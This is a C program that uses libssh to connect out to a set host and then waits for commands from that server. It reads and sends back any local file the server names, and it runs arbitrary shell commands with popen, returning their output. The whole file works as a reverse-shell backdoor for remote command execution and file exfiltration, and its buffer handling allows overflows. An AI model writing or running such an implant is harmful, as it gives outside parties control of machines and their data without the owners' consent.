#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include "ssh_methods.h"
#include "constants.h"

int main(int argc, char** argv){
	// Create session
	ssh_session my_ssh_session;
	my_ssh_session = ssh_new(); 
	session_init(my_ssh_session, HOST, PORT, LOG_LEVEL, CLIENT_TIMEOUT); 
		
	// Connect to session
	int rc = connect_session_client(my_ssh_session, HOST);
	if(rc != SSH_OK)
		exit(-1);

	// Auth (none)
	rc = ssh_userauth_none(my_ssh_session, USERNAME);		

	if( rc != SSH_AUTH_SUCCESS )
		exit(-1);
	
	// Attempt to create channel
	ssh_channel my_channel;
	create_channel_client(my_ssh_session, &my_channel);

	// Used for input from server
	char ibuffer[BUFFER_SIZE], obuffer[BUFFER_SIZE];
	
	// Used for output to server
	ibuffer[BUFFER_SIZE-1] = '\0';
	int nbytes;
	
	sleep(1);

	while( 1 ){
		nbytes = ssh_channel_read(my_channel, ibuffer, BUFFER_SIZE-1, 0);
		ibuffer[nbytes] = '\0';

		if( nbytes > 0){
			printf("(COMMAND) : %s : ", ibuffer);
			
			int i = 0;
			switch(ibuffer[0]){
				case 'G':
					;
					// Open file
					char* filename = (char*)ibuffer+1;
					FILE *fp = fopen(filename, "r");
					
					if( !fp ){
						printf("Failed to read : %s\n", ibuffer+1);
						break;
					}
				
					// Read file	
					i = 0;
					while( (obuffer[i] = fgetc(fp)) > 0 && i < BUFFER_SIZE)
						i++;

					printf("Sending File: %s\n", filename);	
					break;

				case '#':
					;
					char* command = (char*) ibuffer+1;
					
					// Run command
					FILE* pipe = popen(command, "r");
					if( !pipe ){
						fprintf(stderr, "Failed to open %s", command);
						exit(-1);
					}
					
					// Get command output
					i = 0;
					while( (obuffer[i] = fgetc(pipe)) > 0 && i < BUFFER_SIZE)
						i++;
					pclose(pipe);

					break;

				default:
					printf("UNKNOWN\n");
					break;
			}

			printf("SENDING %d BYTES\n", i);

			ssh_channel_write(my_channel, obuffer, i);
			ssh_channel_write(my_channel, "\xFF", 1);
		}
		// No message
		else{
			break;
		}
	}

	printf("Disconnecting\n");	
	ssh_disconnect(my_ssh_session);
	cleanup(my_ssh_session);
}
